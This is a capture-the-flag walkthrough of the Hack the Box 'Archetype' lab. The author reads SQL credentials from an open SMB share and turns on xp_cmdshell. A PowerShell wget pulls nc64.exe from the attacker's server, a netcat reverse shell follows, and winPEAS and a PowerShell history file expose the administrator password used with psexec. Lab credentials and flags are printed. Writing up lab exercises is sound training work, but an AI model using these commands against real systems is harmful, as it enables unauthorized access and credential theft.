# Archetype
* Source: [Hack the Box](https://hackthebox.com/)
* Challenge: Archetype
* Topic: SMB, SQL, impacket, winPEAS, Priviledge
* Difficulty: Very easy
* Date: 13-04-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Tasks
1. Which TCP port is hosting a database server? 
 - **1433**
2. What is the name of the non-Administrative share available over SMB? 
- **backups**
3. What is the password identified in the file on the SMB share? 
- **M3g4c0rp123**
4. What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server? 
- **mssqlclient.py**
5. What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
- **xp_cmdshell**
6. What script can be used in order to search possible paths to escalate privileges on Windows hosts? 
- **winpeas**
7. What file contains the administrator's password? 
- **ConsoleHost_history.txt**
8. Submit user flag 
- **3e7b102e78218e935bf3f4951fec21a3**

---
## Flag:
```console
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -n -sC -sV 10.129.106.199                            
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-13 10:21 EDT
Nmap scan report for 10.129.106.199
Host is up (0.066s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
|_ssl-date: 2022-04-13T14:21:32+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-04-13T14:19:52
|_Not valid after:  2052-04-13T14:19:52
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-04-13T14:21:27
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-04-13T07:21:23-07:00
| ms-sql-info: 
|   10.129.106.199:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_clock-skew: mean: 1h23m59s, deviation: 3h07m50s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.86 seconds
```

It looks like SMB is open, let's try and connect.

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient -L 10.129.106.199    
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.106.199 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient -N \\\\10.129.106.199\\backups   
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                5056511 blocks of size 4096. 2539906 blocks available
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)
smb: \> exit

┌──(kali㉿kali)-[~/Downloads]
└─$ ll          
total 20
-rw-r--r--  1 kali kali  609 Apr 13 10:37 prod.dtsConfig
drwxr-xr-x 10 kali kali 4096 Apr 13 10:37 Responder
-rw-r--r--  1 kali kali 8320 Apr 12 17:37 starting_point_DjikstraCS.ovpn                                                                                                                       
┌──(kali㉿kali)-[~/Downloads]
└─$ cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

There is a password and username hidden in there!

Username: `ARCHETYPE\sql_svc`

Password: `M3g4c0rp123`

Now we just need to find a way to connect. We can use [impacket](https://github.com/SecureAuthCorp/impacket) for this.

```console
┌──(kali㉿kali)-[~/Downloads/impacket]
└─$ mssqlclient.py ARCHETYPE/sql_svc@10.129.106.199 -windows-auth 
Impacket v0.9.25.dev1+20220407.165653.68fd6b79 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL>
```

We are in!

Let's gain a foothold.

```console
SQL> SELECT is_srvrolemember('sysadmin');
              
-----------   
          1   

SQL> xp_cmdshell "whoami"
[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL> EXEC sp_configure 'show advanced options', 1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> sp_configure;
name                                      minimum       maximum   config_value     run_value   

-----------------------------------   -----------   -----------   ------------   -----------   

access check cache bucket count                 0         65536              0             0   

access check cache quota                        0    2147483647              0             0   

Ad Hoc Distributed Queries                      0             1              0             0   

affinity I/O mask                     -2147483648    2147483647              0             0   

affinity mask                         -2147483648    2147483647              0             0
(...)

SQL> EXEC sp_configure 'xp_cmdshell', 1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> xp_cmdshell "whoami"
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.15:81/nc64.exe -outfile nc64.exe"
output                                                                             

--------------------------------------------------------------------------------   
```

Now we can see the files being requested on our HTTP server.

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo python3 -m http.server 81
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
10.129.156.236 - - [13/Apr/2022 12:00:18] "GET /nc64.exe HTTP/1.1" 200 -
```

Now, we just need to run `nc64.exe` in order to establish a connection via netcat.

```
SQL> xp_cmdshell "powershell -c ls C:\Users\sql_svc\Downloads"
output                                                                             

--------------------------------------------------------------------------------

    Directory: C:\Users\sql_svc\Downloads                                          

Mode                LastWriteTime         Length Name

----                -------------         ------ ----

a----        4/13/2022   9:00 AM          45272 nc64.exe

SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.15 444"
```

And we now have a nice stable foothold on the server:

```console
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 444            
listening on [any] 444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.156.236] 49679
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\sql_svc\Downloads>cd ..
cd ..

C:\Users\sql_svc>cd Desktop         
cd Desktop

C:\Users\sql_svc\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\sql_svc\Desktop

01/20/2020  06:42 AM    <DIR>          .
01/20/2020  06:42 AM    <DIR>          ..
02/25/2020  07:37 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,715,213,824 bytes free

C:\Users\sql_svc\Desktop>type user.txt
type user.txt
3e7b102e78218e935bf3f4951fec21a3
```

We found the user flag! Now it is time to go for root.

We can use [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) for that. Let's download winPEASx64.exe to the server and execute it.

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo python3 -m http.server 82
Serving HTTP on 0.0.0.0 port 82 (http://0.0.0.0:82/) ...
10.129.156.236 - - [13/Apr/2022 12:56:28] "GET /winPEASx64.exe HTTP/1.1" 200
```

```console
C:\Users\sql_svc\Downloads>.\winPEASx64.exe

(...)

----------* PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 79B

(...)
```

The `ConsoleHost_history.txt` file might contain some interesting information.

```console
C:\Users\sql_svc\Downloads>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

We found username and password for administrator:

username: `administrator`

administrator: `MEGACORP_4dm1n!!`

We can use `psexec.py` from the [impacket](https://github.com/SecureAuthCorp/impacket) suite to connect. 

```console
┌──(kali㉿kali)-[~]
└─$ psexec.py administrator@10.129.156.236
Impacket v0.9.25.dev1+20220407.165653.68fd6b79 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.129.156.236.....
[*] Found writable share ADMIN$
[*] Uploading file XBySiGIk.exe
[*] Opening SVCManager on 10.129.156.236.....
[*] Creating service gWUC on 10.129.156.236.....
[*] Starting service gWUC.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> dir C:\Users\Administrator\desktop
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\Administrator\desktop

07/27/2021  02:30 AM    <DIR>          .
07/27/2021  02:30 AM    <DIR>          ..
02/25/2020  07:36 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,711,404,544 bytes free

C:\Windows\system32> type C:\Users\Administrator\desktop\root.txt
b91ccec3305e98240082d4474b848528
```

And that is the final flag!


**Flag:** `b91ccec3305e98240082d4474b848528`

---
**Tags:** [[Hack The Box]]